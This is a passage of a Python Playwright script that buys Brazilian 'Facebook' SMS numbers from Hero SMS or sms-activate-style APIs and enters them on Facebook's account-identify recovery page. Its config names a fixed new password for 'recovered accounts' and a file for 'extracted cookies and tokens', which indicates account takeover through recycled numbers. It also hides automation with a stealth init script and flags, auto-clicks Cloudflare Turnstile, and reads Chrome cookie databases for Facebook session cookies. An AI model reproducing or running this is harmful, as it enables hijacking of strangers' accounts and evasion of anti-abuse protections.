"""
Attach to an already logged-in Chrome session, buy a Hero SMS number, copy it,
and paste/fill it into another authorized page.

Setup:
1. Install dependencies:
   python -m pip install playwright pyperclip
   python -m playwright install chromium

2. Start Chrome with remote debugging enabled. Close existing Chrome windows
   first if this command opens a fresh, logged-out profile:
   chrome.exe --remote-debugging-port=9222 --user-data-dir="%USERPROFILE%\\chrome-automation"

3. Log in to Hero SMS in that Chrome window.

3. Store your Hero SMS login in environment variables:
   PowerShell, current window only:
   $env:HERO_SMS_USERNAME="your@email.com"
   $env:HERO_SMS_PASSWORD="your-password"

4. Edit CONFIG below, then run:
   python hero_sms_automation.py
"""

from __future__ import annotations

import os
import re
import time
import sys
import shutil
import json
from dataclasses import dataclass

# Force stdout/stderr to use UTF-8 encoding
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
if hasattr(sys.stderr, 'reconfigure'):
    try:
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

import pyperclip
from playwright.sync_api import Page, sync_playwright

def check_stop_flag() -> None:
    flag_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stop.flag")
    if os.path.exists(flag_path):
        try:
            os.remove(flag_path)
        except:
            pass
        raise KeyboardInterrupt("Stop signal detected")

def update_daily_stats(recovered: int = 0, spent: float = 0.0, duration: int = 0, failed_logins: int = 0, success_duration: int = 0) -> None:
    try:
        from datetime import datetime
        import json
        today_str = datetime.now().strftime("%Y-%m-%d")
        stats_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "recovered_stats.json")
        
        data = {}
        if os.path.exists(stats_path):
            with open(stats_path, "r", encoding="utf-8") as f:
                try:
                    raw_data = json.load(f)
                    for k, v in raw_data.items():
                        if isinstance(v, dict):
                            data[k] = v
                        else:
                            data[k] = {
                                "recovered": int(v),
                                "spent": 0.0,
                                "duration": 0,
                                "failed_logins": 0,
                                "success_duration": 0
                            }
                except:
                    pass
                    
        entry = data.setdefault(today_str, {"recovered": 0, "spent": 0.0, "duration": 0, "failed_logins": 0, "success_duration": 0})
        entry["recovered"] += recovered
        entry["spent"] += spent
        entry["duration"] += duration
        entry.setdefault("failed_logins", 0)
        entry["failed_logins"] += failed_logins
        entry.setdefault("success_duration", 0)
        entry["success_duration"] += success_duration
        
        with open(stats_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Could not record daily statistic: {e}")

def is_chrome_running() -> bool:
    try:
        import subprocess
        if sys.platform == 'win32':
            out = subprocess.check_output("tasklist /FI \"IMAGENAME eq chrome.exe\"", shell=True, text=True)
            return "chrome.exe" in out.lower()
        else:
            out = subprocess.check_output("pgrep -f chrome", shell=True, text=True)
            return bool(out.strip())
    except Exception:
        return False

def close_chrome_on_port(port: int) -> None:
    try:
        import subprocess
        if sys.platform == 'win32':
            cmd = f'for /f "tokens=5" %a in (\'netstat -aon ^| findstr :{port} ^| findstr LISTENING\') do taskkill /F /PID %a'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(f"fuser -k {port}/tcp", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Could not force close Chrome process on port {port}: {e}")

def get_official_chrome_user_data_dir() -> str:
    if sys.platform == 'win32':
        return os.path.expandvars(r"%LocalAppData%\Google\Chrome\User Data")
    elif sys.platform == 'darwin':
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")
    else:
        return os.path.expanduser("~/.config/google-chrome")

def is_profile_logged_in(profile_path: str) -> bool:
    cookie_paths = [
        os.path.join(profile_path, "Network", "Cookies"),
        os.path.join(profile_path, "Cookies"),
        os.path.join(profile_path, "Default", "Network", "Cookies"),
        os.path.join(profile_path, "Default", "Cookies")
    ]
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                import sqlite3
                import tempfile
                import shutil
                
                temp_dir = tempfile.gettempdir()
                temp_cookie_path = os.path.join(temp_dir, f"temp_cookies_check_{os.path.basename(profile_path)}.db")
                try:
                    shutil.copy2(path, temp_cookie_path)
                except Exception:
                    temp_cookie_path = path
                    
                conn = sqlite3.connect(temp_cookie_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
                if not cursor.fetchone():
                    conn.close()
                    continue
                cursor.execute("SELECT name FROM cookies WHERE host_key LIKE '%facebook.com%' AND name='c_user'")
                row = cursor.fetchone()
                conn.close()
                if row:
                    return True
            except Exception as e:
                # If cookie file exists but reading it throws error (e.g. locked db), 
                # assume it is logged in/unsafe to prevent session hijacking
                return True
    return False


def generate_next_profile_name(user_data_dir: str = None, exclude: set = None, force_new: bool = False) -> str:
    if exclude is None:
        exclude = set()
    official_path = get_official_chrome_user_data_dir()
    standalone_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles")
    standalone_fb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb")
    
    existing_profiles = set()
    max_num = 1
    
    # Scan all directories including the Facebook standalone profile directory
    for directory in [official_path, standalone_path, standalone_fb_path]:
        if directory and os.path.exists(directory):
            try:
                for item in os.listdir(directory):
                    if os.path.isdir(os.path.join(directory, item)):
                        match = re.match(r"^Profile\s*(\d+)$", item, re.I)
                        if match:
                            num = int(match.group(1))
                            existing_profiles.add(num)
                            if num > max_num:
                                max_num = num
            except Exception:
                pass

    main_profile = getattr(CONFIG, 'chrome_profile_name', 'Default')
    
    # 1. Proactively check existing profiles to see if we can reuse an empty/logged-out one!
    if not force_new:
        for i in sorted(list(existing_profiles)):
            profile_folder_name = f"Profile {i}"
            
            # Never hijack the main profile or excluded profiles
            if profile_folder_name.lower() == main_profile.lower() or profile_folder_name.lower() in [p.lower() for p in exclude]:
                continue
                
            standalone_dir = os.path.join(standalone_path, profile_folder_name)
            standalone_fb_dir = os.path.join(standalone_fb_path, profile_folder_name)
            official_dir = os.path.join(official_path, profile_folder_name)
            
            is_logged = False
            if os.path.exists(standalone_dir):
                is_logged = is_logged or is_profile_logged_in(standalone_dir)
            if os.path.exists(standalone_fb_dir):
                is_logged = is_logged or is_profile_logged_in(standalone_fb_dir)
            if os.path.exists(official_dir):
                is_logged = is_logged or is_profile_logged_in(official_dir)
                
            if not is_logged:
                # We must also make sure it is not currently open/locked by Chrome
                lock_file = os.path.join(standalone_fb_dir, "lockfile")
                if os.path.exists(lock_file):
                    continue
                    
                print(f"ℹ️ Reusing clean existing profile folder: '{profile_folder_name}'")
                return profile_folder_name

    # 2. If all existing profiles are occupied, generate a brand new one starting above the highest index
    next_num = max_num + 1
    while True:
        profile_folder_name = f"Profile {next_num}"
        if profile_folder_name.lower() == main_profile.lower():
            next_num += 1
            continue
            
        standalone_dir = os.path.join(standalone_path, profile_folder_name)
        standalone_fb_dir = os.path.join(standalone_fb_path, profile_folder_name)
        official_dir = os.path.join(official_path, profile_folder_name)
        
        if not os.path.exists(standalone_dir) and not os.path.exists(standalone_fb_dir) and not os.path.exists(official_dir):
            print(f"ℹ️ Generated fresh unused profile: '{profile_folder_name}'")
            return profile_folder_name
        next_num += 1

def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir: str = "chrome_profiles", is_guest: bool = False, is_mobile: bool = False):
    import subprocess
    import sys
    import time
    
    is_running = is_chrome_running()
    is_standalone = False
    
    if is_guest:
        # For Guest Mode, we use a single dedicated directory for the chrome process instance
        user_data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb_guest")
        os.makedirs(user_data_dir, exist_ok=True)
        is_standalone = True
        print(f"Launching Chrome in GUEST MODE on port {port} (User Data: {user_data_dir})...")
    elif is_running:
        # Each profile gets its own completely isolated User Data Directory to prevent cross-profile tracking
        user_data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), user_data_subdir, profile_name)
        os.makedirs(user_data_dir, exist_ok=True)
        is_standalone = True
        print(f"Chrome is running. Launching standalone profile '{profile_name}' in {user_data_dir}...")
        
        # Sync official profile directory to standalone Default folder for session preservation
        # Skip syncing for Facebook recovery standalone profiles to ensure they start empty and stay signed out
        if user_data_subdir != "chrome_profiles_fb":
            official_profile_dir = os.path.join(get_official_chrome_user_data_dir(), profile_name)
            standalone_profile_dir = os.path.join(user_data_dir, "Default")
            if os.path.exists(official_profile_dir):
                # Only copy official profile if the standalone directory does not exist yet to preserve login sessions!
                if not os.path.exists(standalone_profile_dir):
                    print(f"Syncing official profile '{profile_name}' to standalone for session preservation...")
                    try:
                        import shutil
                        shutil.copytree(official_profile_dir, standalone_profile_dir)
                        print("Profile synced successfully.")
                    except Exception as e:
                        print(f"⚠️ Could not sync official profile: {e}")
                else:
                    print(f"✨ Standalone profile '{profile_name}' already exists. Preserving existing session cookies (staying logged in).")
        else:
            print(f"✨ Facebook recovery standalone session '{profile_name}' will launch completely signed out and fresh.")
    else:
        user_data_dir = get_official_chrome_user_data_dir()
        print(f"Chrome is not running. Launching official profile '{profile_name}'...")
        
    # Prioritize Official Google Chrome over Playwright's clean bundled Chromium to prevent bot flags
    paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe"),
        r"C:\Program Files\Google\Chrome\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\chrome.exe",
    ]
    chrome_path = None
    for p_path in paths:
        if os.path.exists(p_path):
            chrome_path = p_path
            break
    if not chrome_path:
        chrome_path = "chrome.exe"
        
    close_chrome_on_port(port)
    
    if is_guest:
        cmd = [
            chrome_path,
            f"--remote-debugging-port={port}",
            f"--user-data-dir={user_data_dir}",
            "--guest",
            "--no-first-run",
            "--skip-first-run-ui",
            "--no-default-browser-check",
            "--disable-features=ProfilePicker",
            "--disable-features=Translate",
            "--disable-notifications"
        ]
    else:
        profile_dir_flag = "Default" if is_running else profile_name
        cmd = [
            chrome_path,
            f"--remote-debugging-port={port}",
            f"--user-data-dir={user_data_dir}",
            f"--profile-directory={profile_dir_flag}",
            "--no-first-run",
            "--skip-first-run-ui",
            "--no-default-browser-check",
            "--disable-features=ProfilePicker",
            "--disable-features=Translate",
            "--disable-notifications",
            # Bypasses chromium headless flags and matches normal user-driven windows
            "--disable-blink-features=AutomationControlled"
        ]
    
    if is_mobile:
        cmd.append("--user-agent=Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36")
    
    creation_flags = 0
    if sys.platform == 'win32':
        creation_flags = subprocess.CREATE_NEW_CONSOLE
        
    print(f"Launching Chrome on port {port}...")
    try:
        subprocess.Popen(cmd, creationflags=creation_flags)
    except FileNotFoundError:
        print("❌ Google Chrome is not installed on this PC.")
        print("   Install Chrome from https://www.google.com/chrome/ , then click Start again.")
        raise RuntimeError("Google Chrome not found")

    # Wait for Chrome's remote-debugging port to come up. Slower machines / the
    # first launch need more than a fixed 3s, so retry for up to ~30 seconds.
    browser = None
    last_err = None
    for _ in range(60):
        try:
            browser = p.chromium.connect_over_cdp(f"http://127.0.0.1:{port}")
            break
        except Exception as e:
            last_err = e
            time.sleep(0.5)
    if browser is None:
        print("❌ Chrome started but its debug port never opened.")
        print("   Close ALL Chrome windows completely, then click Start again.")
        print("   (If it keeps failing, make sure Google Chrome is installed.)")
        raise last_err
    context = browser.contexts[0] if browser.contexts else browser.new_context()
    
    try:
        context.add_init_script("""
            // 1. Hide navigator.webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });

            // 2. Mock window.chrome
            const mockChrome = {
                app: {
                    isInstalled: false,
                    InstallState: { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
                    RunningState: { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' }
                },
                runtime: {
                    OnInstalledReason: { CHROME_UPDATE: 'chrome_update', INSTALL: 'install', SHARED_MODULE_UPDATE: 'shared_module_update', UPDATE: 'update' },
                    OnRestartRequiredReason: { APP_UPDATE: 'app_update', OS_UPDATE: 'os_update', PERIODIC: 'periodic' },
                    PlatformArch: { ARM: 'arm', ARM64: 'arm64', MIPS: 'mips', MIPS64: 'mips64', X86_32: 'x86-32', X86_64: 'x86-64' },
                    PlatformNaclArch: { ARM: 'arm', MIPS: 'mips', X86_32: 'x86-32', X86_64: 'x86-64' },
                    PlatformOs: { ANDROID: 'android', CROS: 'cros', LINUX: 'linux', MAC: 'mac', OPENBSD: 'openbsd', WIN: 'win' },
                    RequestUpdateCheckStatus: { NO_UPDATE: 'no_update', THROTTLED: 'throttled', UPDATE_AVAILABLE: 'update_available' }
                }
            };
            Object.defineProperty(window, 'chrome', {
                get: () => mockChrome
            });

            // 3. Mock permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );

            // 4. Mock languages & plugins
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
        """)
    except Exception as e:
        print(f"⚠️ Could not inject stealth scripts: {e}")
        
    return browser, context, is_standalone

def sync_profile_to_official(profile_name: str) -> None:
    import shutil
    import json
    
    standalone_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles", profile_name)
    official_dir = os.path.join(get_official_chrome_user_data_dir(), profile_name)
    
    if not os.path.exists(standalone_dir):
        print(f"Standalone profile folder not found: {standalone_dir}")
        return
        
    print(f"Syncing standalone profile '{profile_name}' to official User Data directory...")
    
    try:
        if os.path.exists(official_dir):
            shutil.rmtree(official_dir)
        shutil.copytree(standalone_dir, official_dir)
        print("Profile folder copied successfully.")
    except Exception as e:
        print(f"Could not copy profile folder: {e}")
        return
        
    local_state_path = os.path.join(get_official_chrome_user_data_dir(), "Local State")
    if os.path.exists(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                
            profiles = data.setdefault("profile", {}).setdefault("info_cache", {})
            profile_entry = profiles.setdefault(profile_name, {})
            profile_entry["name"] = f"FB - Recovered"
            
            with open(local_state_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
            print("Registered profile in Chrome Local State successfully.")
        except Exception as e:
            print(f"Could not update Local State: {e}")

def login_if_needed(context) -> None:
    username = os.environ.get("HERO_SMS_USERNAME") or CONFIG.hero_username
    password = os.environ.get("HERO_SMS_PASSWORD") or CONFIG.hero_password
    
    if not username or not password:
        print("HERO_SMS_USERNAME or HERO_SMS_PASSWORD not set in config/env. Skipping auto-login.")
        return
        
    page = context.pages[0] if context.pages else context.new_page()
    page.goto(CONFIG.hero_url)
    page.bring_to_front()

    if already_logged_in(page):
        print("Already logged in.")
        return

    try:
        login_btn = page.locator("a:has-text('Login / Register'), button:has-text('Log in'), a:has-text('Log in'), button:has-text('Login / Register')").first
        if login_btn.is_visible(timeout=5000):
            login_btn.click(timeout=5000)
            time.sleep(1.5)
            print("Clicked Login / Register button to open login form.")
        else:
            print("Login / Register button not visible, assuming login form is already open.")
    except Exception as e:
        print(f"Log in button click skipped or failed: {e}")
    
    print("Filling in email...")
    email_input = page.locator("input[type='email'], input[name='email'], input[placeholder*='email' i]").first
    email_input.wait_for(state="visible", timeout=12000)
    email_input.fill(username)
    time.sleep(0.5)
    
    print("Filling in password...")
    password_input = page.locator("input[type='password'], input[name='password'], input[placeholder*='password' i]").first
    password_input.wait_for(state="visible", timeout=8000)
    password_input.fill(password)
    time.sleep(0.5)
    
    print("Checking for Cloudflare Turnstile verification...")
    try:
        turnstile_iframe = page.locator("iframe").first
        turnstile_iframe.wait_for(state="visible", timeout=15000)
        print("Cloudflare Turnstile iframe detected! Attempting click...")
        
        frame = turnstile_iframe.content_frame()
        checkbox_selector = "#challenge-stage, .ct-checkbox, input[type='checkbox'], #challenge-container"
        checkbox = frame.locator(checkbox_selector).first
        
        checkbox.wait_for(state="attached", timeout=10000)
        checkbox.hover(timeout=3000)
        time.sleep(0.8)
        checkbox.click(timeout=3000, force=True)
        print("Hovered and clicked Cloudflare Turnstile checkbox automatically.")
    except Exception as e:
        print(f"Could not automatically click Turnstile checkbox: {e}")
        print("Please manually click the 'Verify you are human' checkbox in the Chrome window if it doesn't auto-verify.")

    print("Waiting for Cloudflare verification to be solved...")
    verified = False
    start_wait = time.time()
    
    while time.time() - start_wait < 180:
        if already_logged_in(page):
            verified = True
            break
        try:
            token = page.locator("[name='cf-turnstile-response']").first.evaluate("el => el.value")
            if token and len(token.strip()) > 10:
                print("Cloudflare Turnstile verified (checkbox ticked)!")
                verified = True
                break
        except Exception:
            pass
        time.sleep(1.5)
        
    if verified:
        if already_logged_in(page):
            print("Login confirmed during verification!")
            return
            
        print("Waiting 5 seconds before clicking the 'Login' button to avoid bot detection...")
        time.sleep(5)
        
        print("Clicking 'Login' button...")
        try:
            submit_btn = page.locator("button[type='submit'], button:has-text('Login'), button:has-text('Log in')").first
            submit_btn.click(timeout=10000)
        except Exception as e:
            print(f"Failed to click Login button: {e}")
    else:
        print("Cloudflare verification timed out. Skipping automated click.")
    
    time.sleep(3)
    page.wait_for_load_state("networkidle", timeout=30_000)
    time.sleep(2)

    if already_logged_in(page):
        print("Login completed.")
        return

    if page.locator(CONFIG.password_selector).count() > 0:
        print("WARNING: Password field still visible. Continuing anyway.")
        return
    print("Login submitted. Continuing.")


def close_cookies_if_needed(page: Page) -> None:
    try:
        accept_btn = page.locator("button:has-text('Accept all cookies'), button:has-text('Accept cookies'), button:has-text('Accept'), button[class*='cookie'], .cookie-btn").first
        if accept_btn.is_visible(timeout=1000):
            accept_btn.click()
            time.sleep(0.5)
            print("🍪 Accepted cookie consent popup.")
    except Exception:
        pass


def ensure_menu_expanded(page: Page) -> None:
    close_cookies_if_needed(page)
    try:
        # Check if the purchases or get code links are already visible in desktop view
        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
        get_code_btn = page.locator("a:has-text('Get code'), button:has-text('Get code')").first
        
        # If both are hidden/not visible, it means the sidebar/hamburger menu needs to be opened
        if not purchases_btn.is_visible(timeout=1000) and not get_code_btn.is_visible(timeout=500):
            print("📱 Responsive view detected (menu is collapsed). Opening navigation drawer...")
            
            # Check if there is an active hamburger button explicitly visible
            menu_btn = page.locator("button.v-btn--icon, button[aria-label*='menu'], button .v-icon--name-menu").first
            if menu_btn.is_visible(timeout=1000):
                menu_btn.click()
                time.sleep(1.2)
                print("Clicked hamburger menu button.")
                return
                
            # Selectors targeting the top left hamburger menu toggle
            menu_btn = page.locator(
                "button[class*='menu'], button[class*='hamburger'], [class*='toggle-menu'], "
                "[class*='nav-icon'], header button, .header button, .navbar-toggle, "
                ".menu-btn, .hamburger, .header__burger, .nav-toggle, "
                "button:has(svg), header svg, [aria-label*='menu'], [aria-label*='navigation']"
            ).first
            
            if menu_btn.is_visible(timeout=1500):
                menu_btn.click(force=True)
                time.sleep(1) # wait for menu to expand
                print("Clicked hamburger menu button.")
            else:
                # Coordinate fallback for clicking top left area (header logo/menu area)
                print("⚠️ Hamburger button not found by selector. Trying coordinate click at top left (25, 25)...")
                page.mouse.click(25, 25)
                time.sleep(1.5)
    except Exception as e:
        print(f"⚠️ Error opening navigation menu: {e}")


def check_and_recover_server_error(page: Page) -> bool:
    """Detect if Hero SMS threw a 500/505 Server Error, failed i18n load, or crashed, and reload the page."""
    try:
        is_error = False
        
        # 1. Look for specific i18n translation failures
        err_not_found = page.get_by_text("NotFoundPage.link", exact=True).first
        if err_not_found.is_visible(timeout=500):
            is_error = True
            
        # 2. Check if page title is literally "SeoTitle" (translation loading failure)
        elif page.title() == "SeoTitle":
            is_error = True
            
        # 3. Check for typical server error status codes (500, 502, 503, 504, 505) in headers/titles
        else:
            for term in ["500", "502", "503", "504", "505"]:
                heading = page.locator(f"h1:has-text('{term}'), h2:has-text('{term}'), .text-h1:has-text('{term}'), .text-h2:has-text('{term}')").first
                if heading.is_visible(timeout=200):
                    is_error = True
                    break
                    
            if not is_error:
                # Check for general web server error page titles/headings
                for error_title in ["502 Bad Gateway", "503 Service Temporarily Unavailable", "504 Gateway Timeout", "500 Internal Server Error", "Internal Server Error", "Gateway Timeout"]:
                    if page.locator(f"h1:has-text('{error_title}'), title:has-text('{error_title}')").first.is_visible(timeout=100):
                        is_error = True
                        break
        
        if is_error:
            print("⚠️ Hero SMS website returned a server error/crashed (500/505/NotFoundPage)! Reloading page...")
            try:
                page.reload(wait_until="domcontentloaded", timeout=15000)
                time.sleep(2.5)
            except Exception:
                pass
            return True
    except Exception:
        pass
    return False


def check_for_ban(page: Page) -> None:
    """Detect if the Hero SMS account is banned/blocked, and shut down the automation gracefully if it is."""
    try:
        # 1. Extremely robust text content check on the body tag
        body = page.locator("body")
        if body.is_visible(timeout=500):
            body_text = body.inner_text().lower()
            if "your account is banned" in body_text or "account is banned" in body_text:
                print("\n🚨 [CRITICAL ERROR] Hero SMS account ban detected via page text! Shutting down automation gracefully...")
                raise KeyboardInterrupt("Hero SMS account is banned")

        # 2. Backup element check matching the specific banner text
        ban_locator = page.get_by_text(re.compile(r"Your account is banned|account is banned|account.*banned", re.I)).first
        if ban_locator.is_visible(timeout=500):
            print("\n🚨 [CRITICAL ERROR] Hero SMS account ban detected via alert element! Shutting down automation gracefully...")
            raise KeyboardInterrupt("Hero SMS account is banned")
    except KeyboardInterrupt:
        raise
    except Exception:
        pass


def navigate_to_purchases(page: Page) -> bool:
    check_for_ban(page)
    close_cookies_if_needed(page)
    check_and_recover_server_error(page)
    if "purchases" in page.url.lower():
        return True
    print("\n🔍 Ensuring the 'Purchases' page is visible...")
    ensure_menu_expanded(page)
    try:
        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases'), a:has-text('nav.number'), a[href*='purchases']").first
        if purchases_btn.is_visible(timeout=2000):
            purchases_btn.click()
            time.sleep(2)
            print("✅ Navigated to Purchases page.")
            return True
    except Exception as e:
        print(f"⚠️ Could not navigate to Purchases: {e}")
    return False


def navigate_to_get_code(page: Page) -> bool:
    check_for_ban(page)
    close_cookies_if_needed(page)
    check_and_recover_server_error(page)
    print("\n🔍 Ensuring the 'Get code' page is visible...")
    ensure_menu_expanded(page)
    try:
        get_code_btn = page.locator("a:has-text('Get code'), button:has-text('Get code'), a:has-text('Get SMS'), button:has-text('Get SMS'), a:has-text('nav.getBtn'), button:has-text('nav.getBtn'), .v-btn:has-text('nav.getBtn')").first
        if get_code_btn.is_visible(timeout=2000):
            get_code_btn.click()
            time.sleep(2)
            print("✅ Navigated to Get code page.")
            return True
    except Exception as e:
        print(f"⚠️ Could not navigate to Get code via click: {e}")

    # Fallback to direct URL navigation if button was not visible/clickable
    try:
        print("🔗 Fallback: Navigating directly to https://hero-sms.com/...")
        page.goto("https://hero-sms.com/", wait_until="domcontentloaded", timeout=15000)
        time.sleep(2)
        return True
    except Exception as e_goto:
        print(f"⚠️ Direct URL navigation fallback failed: {e_goto}")
    return False


@dataclass(frozen=True)
class AutomationConfig:
    chrome_debug_url: str = "http://127.0.0.1:9222"

    # Login settings. Set auto_login False if you prefer to log in manually.
    auto_login: bool = False
    
    # Identify which Chrome profile is running this script (Useful if running multiple instances)
    chrome_profile_name: str = "Profile 1"
    
    # Set to True if you want it to loop indefinitely. False stops after 1 success.
    multiple_accounts: bool = False
    login_url: str = "https://hero-sms.com/"
    username_selector: str = "input.text-field__input"
    password_selector: str = "input[type='password'].text-field__input"
    submit_selector: str = "button.btn:has-text('Login'), button:has-text('Login')"
    logged_in_url_text: str = "hero-sms.com"
    logged_in_text: str = "My purchases"

    # Put the exact Hero SMS page URL here after you are logged in.
    hero_url: str = "https://hero-sms.com/"

    # Optional visible text to click. Leave blank if you prefer to choose these
    # manually in Chrome before the script buys/extracts the number.
    service_text: str = "Facebook"
    country_text: str = "Brazil"
    buy_text: str = "Buy for $0.099"

    # Target page where the number should be pasted. Use a page you own or are
    # authorized to automate.
    target_url: str = "https://www.facebook.com/login/identify/?ci=AdDhNqxj3bubeKaJl2BAeZF5R84lr1pqkL5Cf2GECCYUaKqqwnbEqH8-EmPr5ktGAoEAQ36l_A8pTW5y1b-Bnht-2xbUC9edHV1cW7O-udVnmbHAM1ZPy-PZmgDLgOHviiToDLhpwlAxn0WywiZA6Y8Wyn-_n9oildrH-L31Wc8bBkOgGVO7udBoB-1zGQIygpu91hfBLtBXTilJ4JnkELUeSBYYFPVtNmnr6RLDvSZ2acPoDdiDrnAOgQOAsKE15PE6ztB0mkwvJZO-LZYfUJXpRt1u"
    target_phone_selector: str = "input[name='email'], input[id='identify_email'], input[type='text'], input[type='tel']"
    
    # Password to set for recovered accounts. If left blank, a random one will be generated.
    new_password: str = "HeroSmsRecover123!"
    # File to save the extracted cookies and tokens
    output_file: str = "recovered_accounts.txt"
    
    # Credentials for Hero SMS
    hero_username: str = ""
    hero_password: str = ""

    # If Hero SMS has a specific element for purchased numbers, set it here.
    # Otherwise the script searches page text for a phone-like number.
    purchased_number_selector: str = ""

    # Set True if you want the script to stop before buying so you can review.
    confirm_before_buy: bool = True
    vpn_connection_name: str = ""
    min_price: float = 0.01
    max_price: float = 0.15

    # ---- API mode (sms-activate protocol: getNumber / getStatus / setStatus) ----
    # When use_api is True, the number + OTP come from the provider's API instead
    # of scraping the website. Works with sms-activate, sms-man, tiger-sms, etc.
    use_api: bool = False
    api_base_url: str = ""      # e.g. https://api.sms-activate.org/stubs/handler_api.php
    api_key: str = ""
    api_service_code: str = ""  # provider's service code, e.g. "fb" for Facebook
    api_country_code: str = "0" # provider's country code, e.g. "0"


def load_config() -> AutomationConfig:
    import json
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
    defaults = {
        "chrome_debug_url": "http://127.0.0.1:9222",
        "auto_login": False,
        "chrome_profile_name": "Profile 1",
        "multiple_accounts": False,
        "service_text": "Facebook",
        "country_text": "Brazil",
        "buy_text": "Buy for $0.099", # Overridden dynamically in execution loop
        "new_password": "HeroSmsRecover123!",
        "confirm_before_buy": True,
        "hero_username": "",
        "hero_password": "",
        "vpn_connection_name": "",
        "min_price": 0.01,
        "max_price": 0.15,
        "use_api": False,
        "api_base_url": "",
        "api_key": "",
        "api_service_code": "",
        "api_country_code": "0"
    }
    
    if os.path.exists(config_path):
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                
            # If target_url is present, we map it too
            merged = defaults.copy()
            merged.update(data)
            
            return AutomationConfig(
                chrome_debug_url=merged.get("chrome_debug_url"),
                auto_login=merged.get("auto_login"),
                chrome_profile_name=merged.get("chrome_profile_name"),
                multiple_accounts=merged.get("multiple_accounts"),
                service_text=merged.get("service_text"),
                country_text=merged.get("country_text"),
                buy_text=merged.get("buy_text"),
                new_password=merged.get("new_password"),
                confirm_before_buy=merged.get("confirm_before_buy"),
                hero_username=merged.get("hero_username", ""),
                hero_password=merged.get("hero_password", ""),
                vpn_connection_name=merged.get("vpn_connection_name", ""),
                min_price=float(merged.get("min_price", 0.01)),
                max_price=float(merged.get("max_price", 0.15)),
                use_api=bool(merged.get("use_api", False)),
                api_base_url=merged.get("api_base_url", ""),
                api_key=merged.get("api_key", ""),
                api_service_code=merged.get("api_service_code", ""),
                api_country_code=str(merged.get("api_country_code", "0"))
            )
        except Exception as e:
            print(f"⚠️ Could not load config.json, using defaults: {e}")
            
    return AutomationConfig()


CONFIG = load_config()


# ==========================================================================
#  SMS PROVIDER API (sms-activate protocol) — used when CONFIG.use_api is on.
#  Standard actions: getNumber / getStatus / setStatus. Works with
#  sms-activate, sms-man, tiger-sms, grizzlysms and other compatible providers.
# ==========================================================================
def _api_call(action, extra=None):
    import urllib.request, urllib.parse
    params = {"api_key": CONFIG.api_key, "action": action}
    if extra:
        params.update(extra)
    sep = "&" if "?" in CONFIG.api_base_url else "?"
    url = CONFIG.api_base_url + sep + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, headers={"User-Agent": "HeroSMS/1.0"})
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode("utf-8", "ignore").strip()


def api_get_number():
    """Order a number. Returns (activation_id, phone) or (None, None)."""
    try:
        resp = _api_call("getNumber", {"service": CONFIG.api_service_code,
                                       "country": CONFIG.api_country_code})
        print(f"🌐 [API] getNumber -> {resp}")
        if resp.startswith("ACCESS_NUMBER"):
            parts = resp.split(":")
            if len(parts) >= 3:
                return parts[1], parts[2]
        hints = {
            "NO_NUMBERS": "no numbers in stock for this service/country",
            "NO_BALANCE": "top up your API balance",
            "BAD_KEY": "wrong API key",
            "BAD_ACTION": "wrong API base URL",
            "BAD_SERVICE": "wrong service code",
        }
        print(f"🔴 [API] Could not get a number ({resp}) — { hints.get(resp, 'check API settings') }.")
        return None, None
    except Exception as e:
        print(f"🔴 [API] getNumber error: {e} (check API base URL / internet)")
        return None, None


def api_get_code(activation_id, timeout_sec: int = 180):
    """Poll getStatus until STATUS_OK:<code>. Returns the code or None."""
    end = time.time() + timeout_sec
    while time.time() < end:
        try:
            resp = _api_call("getStatus", {"id": activation_id})
            if resp.startswith("STATUS_OK"):
                code = resp.split(":", 1)[1] if ":" in resp else ""
                print(f"✅ [API] OTP received: {code}")
                try:
                    _api_call("setStatus", {"id": activation_id, "status": "6"})  # finish
                except Exception:
                    pass
                return code.strip()
            if resp == "STATUS_CANCEL":
                print("🔴 [API] Activation cancelled by provider.")
                return None
            # STATUS_WAIT_CODE / other -> keep polling
